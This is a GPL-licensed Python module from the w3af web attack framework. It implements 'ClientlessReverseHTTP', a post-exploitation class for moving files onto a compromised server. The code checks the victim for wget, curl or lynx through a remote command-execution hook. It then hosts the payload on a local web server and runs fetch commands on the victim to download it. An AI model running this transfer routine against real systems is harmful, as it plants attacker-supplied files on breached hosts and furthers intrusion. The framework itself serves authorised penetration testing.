'''
clientlessReverseHTTP.py

Copyright 2006 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''
import os

import core.controllers.daemons.webserver as webserver
import core.data.kb.config as cf

from core.controllers.misc.temp_dir import get_temp_dir
from core.controllers.intrusion_tools.execMethodHelpers import get_remote_temp_file
from core.controllers.payload_transfer.base_payload_transfer import BasePayloadTransfer
from core.data.fuzzer.utils import rand_alpha


class ClientlessReverseHTTP(BasePayloadTransfer):
    '''
    This is a class that defines how to send a file to a remote server using
    a locally hosted webserver, the remote end uses "wget" or some other command
    like that to fetch the file. Supported commands:
        - wget
        - curl
        - lynx
    '''

    def __init__(self, exec_method, os, inboundPort):
        self._exec_method = exec_method
        self._os = os
        self._inbound_port = inboundPort

        self._command = None

    def can_transfer(self):
        '''
        This method is used to test if the transfer method works as expected.
        The implementation of this should transfer 10 bytes and check if they
        arrived as expected to the other end.
        '''
        #    Here i test what remote command we can use to fetch the payload
        for fetcher in ['wget', 'curl', 'lynx']:
            res = self._exec_method('which ' + fetcher)
            if res.startswith('/'):
                #    Almost there...
                self._command = fetcher

                try:
                    # Lets test if the transfer method works.
                    return self.transfer('test_string\n',
                                         get_remote_temp_file(self._exec_method))
                except:
                    continue

        return False

    def estimate_transfer_time(self, size):
        '''
        :return: An estimated transfer time for a file with the specified size.
        '''
        return int(size / 2000)

    def transfer(self, data_str, destination):
        '''
        This method is used to transfer the data_str from w3af to the compromised server.
        '''
        if not self._command:
            self.can_transfer()

        commandTemplates = {}
        commandTemplates['wget'] = 'wget http://%s:%s/%s -O %s'
        commandTemplates['lynx'] = 'lynx -source http://%s:%s/%s > %s'
        commandTemplates['curl'] = 'curl http://%s:%s/%s > %s'

        # Create the file
        filename = rand_alpha(10)
        file_path = get_temp_dir() + os.path.sep + filename
        f = file(file_path, 'w')
        f.write(data_str)
        f.close()

        # Start a web server on the inbound port and create the file that
        # will be fetched by the compromised host
        webserver.start_webserver(cf.cf.get('local_ip_address'),
                                  self._inbound_port,
                                  get_temp_dir())

        commandToRun = commandTemplates[self._command] % \
            (cf.cf.get('local_ip_address'), self._inbound_port,
             filename, destination)
        self._exec_method(commandToRun)

        os.remove(file_path)

        return self.verify_upload(data_str, destination)

    def get_speed(self):
        '''
        :return: The transfer speed of the transfer object. It should return
                 a number between 100 (fast) and 1 (slow)
        '''
        return 100
